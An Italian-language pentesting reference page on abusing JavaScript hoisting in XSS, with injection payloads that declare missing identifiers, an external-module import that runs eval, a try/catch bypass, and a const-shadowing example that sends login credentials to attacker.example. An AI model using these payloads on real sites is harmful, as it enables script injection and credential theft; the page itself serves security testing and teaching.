# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base

Nel linguaggio JavaScript esiste un meccanismo noto come **Hoisting** in cui le dichiarazioni di variabili, funzioni, classi o import vengono concettualmente spostate in cima al loro scope prima che il codice venga eseguito. Questo processo è eseguito automaticamente dal motore JavaScript, che attraversa lo script in più passaggi.

Durante il primo passaggio, il motore analizza il codice per verificare la presenza di errori di sintassi e lo trasforma in un albero di sintassi astratta. Questa fase include lo hoisting, un processo in cui alcune dichiarazioni vengono mosse in cima al contesto di esecuzione. Se la fase di parsing ha esito positivo, indicando l'assenza di errori di sintassi, l'esecuzione dello script procede.

È cruciale capire che:

1. Lo script deve essere privo di errori di sintassi perché l'esecuzione possa avvenire. Le regole di sintassi devono essere rispettate rigorosamente.
2. La posizione del codice all'interno dello script influisce sull'esecuzione a causa dello hoisting, sebbene il codice eseguito possa differire dalla sua rappresentazione testuale.

#### Tipi di Hoisting

Secondo MDN, ci sono quattro tipi distinti di hoisting in JavaScript:

1. **Value Hoisting**: Permette l'uso del valore di una variabile all'interno del suo scope prima della sua linea di dichiarazione.
2. **Declaration Hoisting**: Consente di riferirsi a una variabile all'interno del suo scope prima della sua dichiarazione senza causare un `ReferenceError`, ma il valore della variabile sarà `undefined`.
3. Questo tipo altera il comportamento all'interno del suo scope a causa della dichiarazione della variabile prima della sua linea di dichiarazione effettiva.
4. Gli effetti collaterali della dichiarazione si verificano prima che il resto del codice che la contiene venga valutato.

Nello specifico, le dichiarazioni di funzione mostrano il comportamento di hoisting di tipo 1. La keyword `var` dimostra il comportamento di tipo 2. Le dichiarazioni lessicali, che includono `let`, `const` e `class`, mostrano il comportamento di tipo 3. Infine, le istruzioni `import` sono uniche in quanto vengono hoisted con comportamenti sia di tipo 1 che di tipo 4.

## Scenari

Quindi, se hai scenari in cui puoi **Inject JS code after an undeclared object** viene usato, puoi **fix the syntax** dichiarandolo (così il tuo codice viene eseguito invece di generare un errore):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Altri scenari
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Hoisting per aggirare la gestione delle eccezioni

Quando il sink è racchiuso in un `try { x.y(...) } catch { ... }`, **ReferenceError** interromperà l'esecuzione prima che il tuo payload venga eseguito. Puoi dichiarare preventivamente l'identificatore mancante in modo che la chiamata sopravviva e la tua espressione iniettata venga eseguita per prima:
```javascript
// Original sink (x and y are undefined, but you control INJECT)
x.y(1,INJECT)

// Payload (ch4n3 2023) – hoist x so the call is parsed; use the first argument position for code exec
prompt()) ; function x(){} //
```
`function x(){}` viene hoisted prima della valutazione, quindi il parser non solleva più errori su `x.y(...)`; `prompt()` viene eseguito prima che `y` sia risolto, poi viene lanciato un `TypeError` dopo che il tuo codice è stato eseguito.

### Anticipare dichiarazioni successive bloccando un nome con const

Se puoi eseguire prima che una top-level `function foo(){...}` sia parsata, dichiarare un binding lessicale con lo stesso nome (es., `const foo = ...`) impedirà alla successiva dichiarazione di function di riassegnare quell'identificatore. Questo può essere abusato in RXSS per dirottare handler critici definiti più avanti nella pagina:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Note
- Questo si basa sull'ordine di esecuzione e sullo scope globale (top-level).
- Se il tuo payload viene eseguito all'interno di `eval()`, ricorda che `const/let` dentro `eval` hanno scope di blocco e non creeranno binding globali. Inietta un nuovo elemento `<script>` con il codice per stabilire un vero `const` globale.

### Dynamic import() with user-controlled specifiers

Le app renderizzate lato server a volte inoltrano input utente in `import()` per lazy-loadare componenti. Se è presente un loader come `import-in-the-middle`, vengono generati wrapper modules dallo specifier. Hoisted import evaluation recupera ed esegue il modulo controllato dall'attaccante prima che le righe successive vengano eseguite, permettendo RCE in contesti SSR (vedi CVE-2023-38704).

### Strumenti

I moderni scanner hanno iniziato ad aggiungere payload espliciti per hoisting. **KNOXSS v3.6.5** elenca "JS Injection with Single Quotes Fixing ReferenceError - Object Hoisting" e "Hoisting Override" come casi di test; eseguirlo contro contesti RXSS che lanciano `ReferenceError`/`TypeError` mette rapidamente in evidenza potenziali gadget basati su hoist.

## Riferimenti

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [XSS Exception Bypass using Hoisting (ch4n3, 2023)](https://new-blog.ch4n3.kr/xss-exception-bypass-using-hoisting/)
- [KNOXSS coverage – hoisting override cases](https://knoxss.pro/?page_id=766)

{{#include ../../banners/hacktricks-training.md}}
